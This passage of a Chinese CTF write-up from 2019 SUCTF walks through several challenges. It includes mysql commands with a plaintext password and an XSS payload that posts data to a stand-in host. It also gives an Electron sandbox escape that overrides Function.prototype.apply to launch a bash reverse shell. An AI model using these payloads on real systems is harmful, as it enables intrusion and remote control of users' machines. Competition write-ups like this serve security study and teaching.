+<p><img src="https://i.loli.net/2019/09/05/WKvYDS6LZsNoEVJ.png" alt="FF485A77-74E1-4E41-82CA-086B1F045092.png"></p>
+<p>所以可能稍微麻烦一点，我们得用之前得到的mysql账号密码来查看数据库的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;show databases;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/05/fKdHt4SpQmzAnle.png" alt="68872B88-735E-49F6-A900-A12F57569938.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;show tables;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/05/Kr4mvRwXLbkIBeg.png" alt="A70813D1-5BD6-4CC7-A1F7-7A98FA6341B2.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e &quot;use flag;select * from flag;&quot; &gt; /tmp/zero.txt &amp;&amp; cat /tmp/zero.txt &amp;&amp; rm /tmp/zero.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/05/S7BDRxJkFsZygEf.png" alt="2A034AD6-0DFB-4FBD-A607-D299ACD5DFF1.png"></p>
+<h2 id="0x07-iCloudMusic"><a href="#0x07-iCloudMusic" class="headerlink" title="0x07 iCloudMusic"></a>0x07 iCloudMusic</h2><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>题目做累了就来听听歌放放松吧。比如黑客专属歌单id： 2810583532 ps: api可能会被网易封ip导致没办法听歌，但是不影响做题</p>
+<p>附件下载链接: <a href="https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw" target="_blank" rel="noopener">https://pan.baidu.com/s/1GLfe-PP30bsIkVPvE012Hw</a> 提取码: 37gn</p>
+<p>coding上传了一份， 大家网不好的可以到coding上面下 <a href="https://coding.net/u/ImageMLT/p/iCloudMusic/git" target="_blank" rel="noopener">https://coding.net/u/ImageMLT/p/iCloudMusic/git</a></p>
+<h4 id="题目解答-6"><a href="#题目解答-6" class="headerlink" title="题目解答"></a>题目解答</h4><p>下载之后发现是一个Electron框架写的webapp，因此直接采用常规的Electron应用分析方式来进行分析，本文的环境是macOS，其余同理。</p>
+<p>首先进入到如下目录找到asar结尾的文件，此处的名字是<code>app.asar</code>，这是一种类似tar的打包之后的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/zeroyu/Downloads/iCloudMusic-darwin-x64/iCloudMusic.app/Contents/Resources</span><br></pre></td></tr></table></figure></p>
+<p>之后使用npm全局安装asar工具，来进行解包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar extract app.asar tmp</span><br></pre></td></tr></table></figure>
+<p>之后进入解包的目录，安装相关依赖后启动app</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>
+<p>首先分析代码发现<code>src/index.js</code>中<code>nodeIntegration</code>是开启的，说明可以注入代码来达到rce的目的。</p>
+<p>随后又在<code>src/main.js</code>文件中发现如下代码，这段代码说明可以执行任意代码了</p>
+<p><img src="https://i.loli.net/2019/09/05/QLyrleC4G7fSP2d.png" alt="9C84AE9D-422B-4C9F-8D5E-3C5BDEBC23E9.png"></p>
+<p>之后，又在<code>src/list.html</code>中发现用于分享给管理员的代码，所以起初就判断是xss</p>
+<p><img src="https://i.loli.net/2019/09/05/kWtoO7mvAxdwuLs.png" alt="24038218-01F0-4F92-8EB6-159EB9E88871.png"></p>
+<p>所以在分析如下接口的信息之后构造出如下poc来尝试读取一些信息(@5am3 tql)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;header&quot;:&quot;&apos;var t = new XMLHttpRequest;t.open(&apos;POST&apos;, &apos;//eval.com:port&apos;, !0),t.setRequestHeader(&apos;Content-type&apos;, &apos;text/plain&apos;),t.onreadystatechange = function() &#123;  4 == t.readyState &amp;&amp; t.status&#125;,t.send(&apos;test,hhhh&apos;);//&#125;;&quot;,&quot;title&quot;:&quot;xxxx&quot;,&quot;desc&quot;:&quot;xxx&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>由于始终打不到flag相关字眼，所以就问了出题人，说要rce，如实转换思路开始rce之旅</p>
+<p>再进一步调试前，首先增加一些便于调试的代码</p>
+<ol>
+<li>在<code>src/main.js</code>中添加如下代码</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webview = <span class="built_in">document</span>.getElementById(<span class="string">"view"</span>);</span><br><span class="line">webview.addEventListener(<span class="string">"dom-ready"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  webview.openDevTools();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在<code>src/index.js</code>中的20行左右添加如下代码</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainWindow.openDevTools();</span><br></pre></td></tr></table></figure>
+<p>之后启动app的话就会有两个开发者视图窗口，其中title是http开头的是view的调试窗口，之后尝试来导入模块执行命令，发现在沙箱环境中失败的。</p>
+<p><img src="https://i.loli.net/2019/09/05/YPG87OgLlItiKo4.png" alt="0303F269-CE22-4FFE-B389-C4B77EF978F9.png"></p>
+<p>但是在另一个视图中是可以执行成功的</p>
+<p><img src="https://i.loli.net/2019/09/05/msHyRIeSvQ71Vki.png" alt="5BDE4A65-83FD-4AC5-B9D7-EFBEA9C6CC71.png"></p>
+<p>所以应该是main.js中关于导入包的功能没开，所以无法导入模块，来进行rce</p>
+<p>PS: 这里的的view是一个webview窗口，相当于是一个沙盒。默认是没有办法调用系统api的。</p>
+<p>之后根据hint来阅读相关文章时，可以知道到如下信息：</p>
+<blockquote>
+<p>由于contextisolation关闭，可以导致webview沙盒内与pr.js内变量在同一作用域，可以覆盖pr.js的变量。而且pr.js是不在沙盒运行限制内。所以，只要想办法覆盖掉pr.js的函数调用逻辑，即可绕过webview沙盒。</p>
+</blockquote>
+<p>所以就有了官方题解的第一种paylaod，暴力覆写所有函数</p>
+<p>首先进行初步覆写，目的是找到一个<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> args)</span><br><span class="line">        <span class="keyword">if</span>(args[i])</span><br><span class="line">        <span class="built_in">console</span>.log(args[i].toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在带有title的那个devtools里面首先执行上述代码，之后执行如下代码，便可以找到<code>process</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.get(<span class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/09/05/7qYNs8JWiSdBPLA.png" alt="4AE71B08-7379-416E-AF2A-AD6A693D8F71.png"></p>
+<p>之后改写paylaod便可以直接rce了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="literal">null</span> &amp;&amp; args[<span class="number">0</span>]!=<span class="literal">undefined</span> &amp;&amp; args[<span class="number">0</span>].env!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="built_in">Function</span>.prototype.apply=<span class="built_in">Function</span>.prototype.apply2;</span><br><span class="line">        args[<span class="number">0</span>].mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/XXXXXX/8080 0&gt;&amp;1"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args)</span><br><span class="line">&#125;</span><br><span class="line">request.get(<span class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到成功反弹了shell<br><img src="https://i.loli.net/2019/09/05/ajvDxVtKH7Q4m5r.png" alt="403CCAC2-DE75-4FE2-810E-B8DB1D2BBE5F.png"><br>但是这样反弹的是你本地的shell，之后想得到flag还得结合之前提到的xss</p>
+<p>上面这种暴力fuzz的方式，直接get到了request库中是有process的相关调用的，进而达到了rce的效果，那么从白盒角度是怎么进行分析的呢？</p>
+<p>从作者的<a href="https://github.com/imagemlt/iCloudMusic" target="_blank" rel="noopener">github</a>上我了解到，request库/http库/其他很多node库是都有可能调用process相关函数的，比如process.nextTick</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ (...args) &#123;</span><br><span class="line">            process.activateUvLoop();</span><br><span class="line">            <span class="keyword">return</span> func.apply(<span class="keyword">this</span>, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>这里面的<code>func.apply</code>其实就是<code>Function.prototype.apply</code>，并且这里面的this就是指向process自身。我们可以在request里面看到对这个函数的调用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defer = <span class="keyword">typeof</span> setImmediate === <span class="string">'undefined'</span></span><br><span class="line">  ? process.nextTick</span><br><span class="line">  : setImmediate</span><br></pre></td></tr></table></figure>
+<p>http库中用与处理socket请求的一个关键函数也调用了这个函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClientRequest.prototype.onSocket = <span class="function"><span class="keyword">function</span> <span class="title">onSocket</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  process.nextTick(onSocketNT, <span class="keyword">this</span>, socket);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>所以从白盒的角度来看可以更好的知道为什么上面的payload可以达到rce</p>
+<h2 id="0x08-Game"><a href="#0x08-Game" class="headerlink" title="0x08 Game"></a>0x08 Game</h2><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>How fast can you play?</p>
+<p><a href="http://47.111.59.243:1081" target="_blank" rel="noopener">http://47.111.59.243:1081</a></p>
+<h4 id="题目解答-7"><a href="#题目解答-7" class="headerlink" title="题目解答"></a>题目解答</h4><p>直接查看源代码得到flag（假的，emmmm</p>
+<p>view-source:<a href="http://47.111.59.243:1081/" target="_blank" rel="noopener">http://47.111.59.243:1081/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div class=&quot;text text--best-time&quot;&gt;</span><br><span class="line">    &lt;icon trophy&gt;&lt;/icon&gt;</span><br><span class="line">    &lt;span&gt;Well done!，</span><br><span class="line"> here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===	  &lt;/span&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>base32后得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;hAHaha_Fak3_F1ag&#125;</span><br></pre></td></tr></table></figure>
+<p>既然是个游戏就有可能是改的开源代码，所以抱这这种想法就去找了源码，就找到了</p>
+<p><a href="http://www.jq22.com/jquery-info21216" target="_blank" rel="noopener">http://www.jq22.com/jquery-info21216</a></p>
+<p>然后从里面diff出不同点<br><img src="https://i.loli.net/2019/09/05/xnwBoXb1lgv93q7.png" alt="71F7F13A-9AB1-4D56-BCE1-38E2BD91E070.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var acd = mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png;</span><br></pre></td></tr></table></figure>
+<p>之后下载图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://47.111.59.243:1081/iZwz9i9xnerwj6o7h40eauZ.png</span><br></pre></td></tr></table></figure></p>
+<p>分析之后发现是lsb隐写<br><img src="https://i.loli.net/2019/09/05/Lw9j2aX8mvonHFu.png" alt="0E0DEF7B-AD12-434C-A7F2-6640F150B0C7.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</span><br></pre></td></tr></table></figure>
+<p>使用3des解密即可得到flag<br><img src="https://i.loli.net/2019/09/05/CeHyOgw8f9QdzZq.png" alt="30A0E76B-7523-477C-88FB-E400F79C097A.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CheckIn"><span class="toc-number">2.</span> <span class="toc-text">0x01 CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EasyPHP"><span class="toc-number">3.</span> <span class="toc-text">0x02 EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Pythonginx"><span class="toc-number">4.</span> <span class="toc-text">0x03 Pythonginx</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-easy-sql"><span class="toc-number">5.</span> <span class="toc-text">0x04 easy_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-3"><span class="toc-number">5.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-3"><span class="toc-number">5.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Upload-labs-2"><span class="toc-number">6.</span> <span class="toc-text">0x05 Upload labs 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-4"><span class="toc-number">6.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-4"><span class="toc-number">6.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Cocktail’s-Remix"><span class="toc-number">7.</span> <span class="toc-text">0x06 Cocktail’s Remix</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-5"><span class="toc-number">7.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-5"><span class="toc-number">7.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-iCloudMusic"><span class="toc-number">8.</span> <span class="toc-text">0x07 iCloudMusic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-6"><span class="toc-number">8.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-6"><span class="toc-number">8.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Game"><span class="toc-number">9.</span> <span class="toc-text">0x08 Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-7"><span class="toc-number">9.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-7"><span class="toc-number">9.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&text=2019 suctf writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&is_video=false&description=2019 suctf writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019 suctf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&title=2019 suctf writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/05/2019-suctf-writeup/&name=2019 suctf writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-129276044-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'z3r0yu';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
